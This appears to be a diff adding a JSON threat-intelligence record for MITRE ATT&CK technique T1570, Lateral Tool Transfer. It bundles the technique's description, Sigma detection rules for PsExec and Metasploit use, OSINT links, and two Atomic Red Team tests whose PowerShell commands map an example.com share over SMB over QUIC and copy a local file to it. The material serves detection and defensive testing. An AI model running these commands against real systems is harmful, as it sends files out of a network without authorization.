@@ -1,0 +1,172 @@
+{
+    "id": "T1570",
+    "name": "Lateral Tool Transfer",
+    "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [SMB/Windows Admin Shares](T1021.002) or [Remote Desktop Protocol](T1021.001). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Lateral Movement",
+    "data_sources": "Network Share: Network Share Access, Named Pipe: Named Pipe Metadata, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content, Command: Command Execution, Process: Process Creation, File: File Creation, File: File Metadata",
+    "detection": "Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
+    "url": "https://attack.mitre.org/techniques/T1570",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "1a17ce75-ff0d-4f02-9709-2b7bb5618cf0",
+                    "5bb68627-3198-40ca-b458-49f973db8752",
+                    "304afd73-55a5-4bb9-8c21-0b1fc84ea9e4",
+                    "bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+                    "6fb63b40-e02a-403e-9ffd-3bcc1d749442",
+                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                    "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                    "cdc842aa-761d-48e2-9b97-c344bed8b3a8"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "1a17ce75-ff0d-4f02-9709-2b7bb5618cf0",
+                        "lookup_data": {
+                            "description": "Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and Impacket psexec.py by triggering on specific service installation",
+                            "raw": "action: global\nauthor: Bartlomiej Czyz, Relativity\ndate: 2021/01/21\ndescription: Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and\n  Impacket psexec.py by triggering on specific service installation\ndetection:\n  condition: selection and selection_1 and not filter\n  filter:\n    ServiceName: PSEXESVC\n  selection_1:\n    ServiceFileName|re: ^.*\\\\[a-zA-Z]{8}\\.exe$\n    ServiceName|re: (^[a-zA-Z]{4}$)|(^[a-zA-Z]{8}$)|(^[a-zA-Z]{16}$)\nfalsepositives:\n- Highly unlikely\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\n- ServiceName\n- ServiceFileName\nid: 1a17ce75-ff0d-4f02-9709-2b7bb5618cf0\nlevel: high\nreferences:\n- https://bczyz1.github.io/2021/01/30/psexec.html\ntags:\n- attack.lateral_movement\n- attack.t1021.002\n- attack.t1570\n- attack.execution\n- attack.t1569.002\ntitle: Metasploit Or Impacket Service Installation Via SMB PsExec\n",
+                            "sigma:id": "1a17ce75-ff0d-4f02-9709-2b7bb5618cf0",
+                            "title": "Metasploit Or Impacket Service Installation Via SMB PsExec",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5bb68627-3198-40ca-b458-49f973db8752",
+                        "lookup_data": {
+                            "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
+                            "raw": "author: Bartlomiej Czyz, Relativity\ndate: 2021/01/31\ndescription: Detects rundll32 execution without parameters as observed when running\n  Metasploit windows/smb/psexec exploit module\ndetection:\n  condition: selection\n  selection:\n    CommandLine: rundll32.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- SubjectUserName\n- CommandLine\n- Image\n- ParentImage\nid: 5bb68627-3198-40ca-b458-49f973db8752\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://bczyz1.github.io/2021/01/30/psexec.html\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1021.002\n- attack.t1570\n- attack.execution\n- attack.t1569.002\ntitle: Rundll32 Without Parameters\n",
+                            "sigma:id": "5bb68627-3198-40ca-b458-49f973db8752",
+                            "title": "Rundll32 Without Parameters",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "304afd73-55a5-4bb9-8c21-0b1fc84ea9e4",
+                        "lookup_data": {
+                            "description": "Detects creation of the PSEXEC key file. Which is created anytime a PsExec command is executed and gets written to the file system and will be recorded in the USN Journal on the target system",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/21\ndescription: Detects creation of the PSEXEC key file. Which is created anytime a PsExec\n  command is executed and gets written to the file system and will be recorded in\n  the USN Journal on the target system\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: .key\n    TargetFilename|startswith: C:\\Windows\\PSEXEC-\nfalsepositives:\n- Unlikely\nid: 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://aboutdfir.com/the-key-to-identify-psexec/\n- https://twitter.com/davisrichardg/status/1616518800584704028\nstatus: experimental\ntags:\n- attack.lateral_movement\n- attack.privilege_escalation\n- attack.execution\n- attack.persistence\n- attack.t1136.002\n- attack.t1543.003\n- attack.t1570\n- attack.s0029\ntitle: Potential PSEXEC Remote Execution - FileCreation\n",
+                            "sigma:id": "304afd73-55a5-4bb9-8c21-0b1fc84ea9e4",
+                            "title": "Potential PSEXEC Remote Execution - FileCreation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1570",
+                            "mitre-cti:description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).",
+                            "mitre-cti:name": "Lateral Tool Transfer",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5', 'created': '2020-03-11T21:01:00.959Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1570', 'url': 'https://attack.mitre.org/techniques/T1570'}, {'source_name': 'Unit42 LockerGoga 2019', 'url': 'https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/', 'description': 'Harbison, M. (2019, March 26). Born This Way? Origins of LockerGoga. Retrieved April 16, 2019.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\\n\\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).', 'modified': '2022-04-19T15:34:49.016Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Lateral Tool Transfer', 'x_mitre_detection': 'Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content', 'Named Pipe: Named Pipe Metadata', 'File: File Creation', 'File: File Metadata', 'Command: Command Execution', 'Process: Process Creation', 'Network Share: Network Share Access', 'Network Traffic: Network Traffic Flow'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6fb63b40-e02a-403e-9ffd-3bcc1d749442",
+                        "lookup_data": {
+                            "description": "Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and Impacket psexec.py by triggering on specific service installation",
+                            "raw": "author: Bartlomiej Czyz, Relativity\ndate: 2021/01/21\ndescription: Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and\n  Impacket psexec.py by triggering on specific service installation\ndetection:\n  condition: selection and not filter\n  filter:\n    ServiceName: PSEXESVC\n  selection:\n    EventID: 4697\n    ServiceFileName|re: ^%systemroot%\\\\[a-zA-Z]{8}\\.exe$\n    ServiceName|re: (^[a-zA-Z]{4}$)|(^[a-zA-Z]{8}$)|(^[a-zA-Z]{16}$)\n    ServiceStartType: 3\n    ServiceType: '0x10'\nfalsepositives:\n- Possible, different agents with a 8 character binary and a 4, 8 or 16 character\n  service name\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\n- ServiceName\n- ServiceFileName\nid: 6fb63b40-e02a-403e-9ffd-3bcc1d749442\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/10/05\nreferences:\n- https://bczyz1.github.io/2021/01/30/psexec.html\nrelated:\n- id: 1a17ce75-ff0d-4f02-9709-2b7bb5618cf0\n  type: derived\nstatus: experimental\ntags:\n- attack.lateral_movement\n- attack.t1021.002\n- attack.t1570\n- attack.execution\n- attack.t1569.002\ntitle: Metasploit Or Impacket Service Installation Via SMB PsExec\n",
+                            "sigma:id": "6fb63b40-e02a-403e-9ffd-3bcc1d749442",
+                            "title": "Metasploit Or Impacket Service Installation Via SMB PsExec",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                        "lookup_data": {
+                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
+                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1674763285",
+                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                        "lookup_data": {
+                            "description": "Operation â€˜Harvestâ€™: A Deep Dive into a Long-term Campaign",
+                            "link": "http://www.botvrij.eu/data/feed-osint/c1bd5026-520b-45bd-9a79-82d38cf96c7b.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1633469315",
+                            "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                        "lookup_data": {
+                            "description": "Cyberattack on fuel supplier causes supply chain disruption",
+                            "link": "http://www.botvrij.eu/data/feed-osint/cdc842aa-761d-48e2-9b97-c344bed8b3a8.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1644231782",
+                            "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1570",
+                "display_name": "Lateral Tool Transfer",
+                "atomic_tests": [
+                    {
+                        "name": "Exfiltration Over SMB over QUIC (New-SmbMapping)",
+                        "auto_generated_guid": "d8d13303-159e-4f33-89f4-9f07812d016f",
+                        "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "remote_path": {
+                                "description": "The UNC path to the share on the file server",
+                                "type": "string",
+                                "default": "\\\\example.com\\sales"
+                            },
+                            "local_file": {
+                                "description": "The local file to be transferred",
+                                "type": "path",
+                                "default": "C:\\path\\to\\file.txt"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Exfiltration Over SMB over QUIC (NET USE)",
+                        "auto_generated_guid": "183235ca-8e6c-422c-88c2-3aa28c4825d9",
+                        "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "remote_path": {
+                                "description": "The UNC path to the share on the file server",
+                                "type": "string",
+                                "default": "\\\\example.com\\sales"
+                            },
+                            "local_file": {
+                                "description": "The local file to be transferred",
+                                "type": "path",
+                                "default": "C:\\path\\to\\file.txt"
+                            }
+                        },
+                        "executor": {
+                            "command": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 17:17:14"
+}
